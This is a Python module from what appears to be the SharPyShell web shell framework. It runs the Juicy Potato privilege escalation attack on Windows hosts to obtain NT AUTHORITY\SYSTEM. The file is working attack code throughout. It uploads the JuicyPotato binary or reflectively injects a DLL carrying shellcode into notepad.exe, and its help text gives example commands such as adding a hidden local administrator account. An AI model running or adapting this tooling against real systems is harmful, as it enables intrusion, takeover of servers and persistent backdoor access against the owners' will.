from core.Module import Module, ModuleException
from core import config
from modules.upload import Upload
from modules.exec_cmd import Exec_cmd
from modules.inject_dll_reflective import Inject_dll_reflective
from utils.random_string import random_generator
from utils import shellcode
import random
import traceback


class PrivescJuicyPotatoModuleException(ModuleException):
    pass


class Privesc_juicy_potato(Module):
    _exception_class = PrivescJuicyPotatoModuleException
    short_help = r"Launch InMem Juicy Potato attack trying to impersonate NT AUTHORITY\SYSTEM"
    complete_help = r"""
        Authors:    @decoder @ohpe @phra @lupman
        Links:      https://github.com/ohpe/juicy-potato
                    https://github.com/phra/metasploit-framework/blob/e69d509bdf5c955e673be44b8d87b915272836d9/modules/exploits/windows/local/ms16_075_reflection_juicy.rb
        
        
        Juicy Potato is a Local Privilege Escalation tool that allows to escalate privileges from a Windows Service
        Accounts to NT AUTHORITY\SYSTEM.
        This permits to run an os command as the most privileged user 'NT AUTHORITY\SYSTEM'.
        It is needed that the service account running w3wp.exe has the permission of 'SeImpersonatePrivilege' enabled. 
        You can check it with 'whoami /priv' 
        
        This vulnerability is no longer exploitable with Windows Server 2019:
        https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/
        
        
        Usage:
            #privesc_juicy_potato cmd [exec_type] [clsid] [custom_shellcode_path]
        
        Positional arguments:
            cmd                     command supported by cmd.exe
            exec_type               Type of execution of juicy potato, values can be:
                                        - 'reflective_dll'
                                        - 'exe'
                                    Default: 'reflective_dll'
            clsid                   target CLSID to reflect
                                    Default: '{4991d34b-80a1-4291-83b6-3328366b9097}' (BITS)
            custom_shellcode_path   path to a file containing shellcode (format raw)
                                    if set, this module will ignore 'cmd' argument
                                    Default: 'default'
        
        Examples:
            Add a new local admin:
                #privesc_juicy_potato 'net user /add admin_test JuicyAdmin_1_2_3! /Y & net localgroup Administrators admin_test /add'
            Run juicy reflecting a custom COM CLSID:
                #privesc_juicy_potato 'echo custom_clsid > C:\windows\temp\custom_clsid.txt' 'reflective_dll' '{752073A1-23F2-4396-85F0-8FDB879ED0ED}'
            Run whoami with the classic Juicy Potato binary:
                #privesc_juicy_potato 'whoami > C:\windows\temp\whoami_juicy.txt' 'exe'
    """

    _runtime_code = r"""
                   using System;using System.IO;using System.Diagnostics;using System.Text;
                   public class SharPyShell
                   {                    
                       string ExecCmd(string exe_path, string arguments, string cmd, string working_path)
                       {
                           string cmd_path = Environment.GetEnvironmentVariable("ComSpec");
                           ProcessStartInfo pinfo = new ProcessStartInfo();
                           pinfo.FileName = exe_path;
                           pinfo.Arguments = arguments + " " + cmd_path + " -a \" " + cmd_path + " /c " + cmd + "\"";
                           pinfo.RedirectStandardOutput = true;
                           pinfo.RedirectStandardError = true;
                           pinfo.UseShellExecute = false;
                           pinfo.WorkingDirectory = working_path;
                           Process p = new Process();
                           try{
                               p = Process.Start(pinfo);
                           }
                           catch (Exception e){
                               return "{{{SharPyShellError}}}\n" + e;
                           }
                           StreamReader stmrdr_output = p.StandardOutput;
                           StreamReader stmrdr_errors = p.StandardError;
                           string output = "";
                           string stand_out = stmrdr_output.ReadToEnd();
                           string stand_errors = stmrdr_errors.ReadToEnd();
                           stmrdr_output.Close();
                           stmrdr_errors.Close();
                           if (!String.IsNullOrEmpty(stand_out))
                               output = output + stand_out;
                           if (!String.IsNullOrEmpty(stand_errors))
                               output = "{{{SharPyShellError}}}\n" + output + stand_errors;
                           return output;
                       }

                       public byte[] ExecRuntime()
                       {
                           string output_func=ExecCmd(@"%s", @"%s", @"%s", @"%s");
                           byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                           return(output_func_byte);
                       }
                   }
                   """

    __default_exec_type = 'reflective_dll'
    __default_clsid = '{4991d34b-80a1-4291-83b6-3328366b9097}'
    __default_custom_shellcode_path = 'default'

    def __init__(self, password, channel_enc_mode, module_settings, request_object):
        Module.__init__(self, password, channel_enc_mode, module_settings, request_object)
        self.upload_module_object = Upload(password, channel_enc_mode, module_settings, request_object)
        self.exec_cmd_module_object = Exec_cmd(password, channel_enc_mode, module_settings, request_object)
        self.inject_dll_reflective_module_object = Inject_dll_reflective(password, channel_enc_mode,
                                                                         module_settings, request_object)

    def __parse_run_args(self, args):
        if len(args) < 1:
            raise self._exception_class('#privesc_juicy_potato : Not enough arguments.1 Argument required. \n')
        args_parser = {k: v for k, v in enumerate(args)}
        cmd = args_parser.get(0)
        exec_type = args_parser.get(1, self.__default_exec_type)
        self.__random_listening_port = str(random.randint(10000, 65000))
        clsid = args_parser.get(2, self.__default_clsid)
        arguments = ' -t * -l %s -c %s -p '
        arguments = arguments % (self.__random_listening_port, clsid)
        custom_shellcode_path = args_parser.get(3, self.__default_custom_shellcode_path )
        return cmd, exec_type, arguments, custom_shellcode_path, clsid

    def __lookup_binary(self):
        if 'JuicyPotato.exe' in self._module_settings.keys():
            bin_path = self._module_settings['JuicyPotato.exe']
        else:
            exe_path = config.modules_paths + 'exe_modules/JuicyPotato.exe'
            remote_upload_path = self._module_settings['env_directory'] + '\\' + random_generator() + '.exe'
            print ('\n\n\nUploading Juicy Potato binary....\n')
            upload_response = self._parse_response(self.upload_module_object.run([exe_path, remote_upload_path]))
            print (upload_response)
            self._module_settings['JuicyPotato.exe'] = remote_upload_path
            bin_path = remote_upload_path
        return bin_path

    def __run_exe_version(self, cmd, arguments):
        exe_path = self.__lookup_binary()
        working_path = self._module_settings['working_directory']
        request = self._runtime_code % (exe_path, arguments, cmd, working_path)
        encrypted_request = self._encrypt_request(request)
        encrypted_response = self._post_request(encrypted_request)
        decrypted_response = self._decrypt_response(encrypted_response)
        parsed_response = self._parse_response(decrypted_response)
        return parsed_response

    def __run_reflective_dll_version(self, cmd, custom_shellcode_path, logfile, clsid):
        LogFile = logfile.encode()
        remote_process = b'notepad.exe'
        CLSID = clsid.encode()
        ListeningPort = self.__random_listening_port.encode()
        RpcServerHost = b'127.0.0.1'
        RpcServerPort = b'135'
        ListeningAddress = b'127.0.0.1'
        if custom_shellcode_path == 'default':
            shellcode_bytes = shellcode.winexec_x64 + b'cmd /c "' + cmd.encode() + b'"\00'
            thread_timeout = '60000'
        else:
            thread_timeout = '0'
            with open(custom_shellcode_path, 'rb') as file_handle:
                shellcode_bytes = file_handle.read()
        configuration = LogFile + b'\00'
        configuration += remote_process + b'\00'
        configuration += CLSID + b'\00'
        configuration += ListeningPort + b'\00'
        configuration += RpcServerHost + b'\00'
        configuration += RpcServerPort + b'\00'
        configuration += ListeningAddress + b'\00'
        configuration += str(len(shellcode_bytes)).encode() + b'\00'
        configuration += shellcode_bytes
        configuration_bytes_csharp = '{' + ",".join('0x{:02x}'.format(x) for x in configuration) + '}'
        response = self.inject_dll_reflective_module_object.run(['juicypotato_reflective.dll', 'remote_virtual',
                                                                'cmd.exe', thread_timeout, configuration_bytes_csharp])
        parsed_response = self._parse_response(response)
        return parsed_response

    def _create_request(self, args):
        exe_path, arguments, cmd = args
        working_path = self._module_settings['working_directory']
        return self._runtime_code % (exe_path, arguments, cmd, working_path)

    def run(self, args):
        try:
            cmd, exec_type, arguments, custom_shellcode_path, clsid = self.__parse_run_args(args)
            if exec_type == 'exe':
                response = self.__run_exe_version(cmd, arguments)
            else:
                logfile = self._module_settings['env_directory'] + '\\' + random_generator()
                print ('\n\nInjecting Reflective DLL into remote process...')
                response = self.__run_reflective_dll_version(cmd, custom_shellcode_path, logfile, clsid)
                response += '\nReflective DLL injection executed!\n\n'
                if custom_shellcode_path == 'default':
                    response += '\nOutput of juicy potato:\n\n'
                    response += self.exec_cmd_module_object.run(['type ' + logfile + ' & del /f /q ' + logfile])
            parsed_response = self._parse_response(response)
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' + str(traceback.format_exc())
        return parsed_response
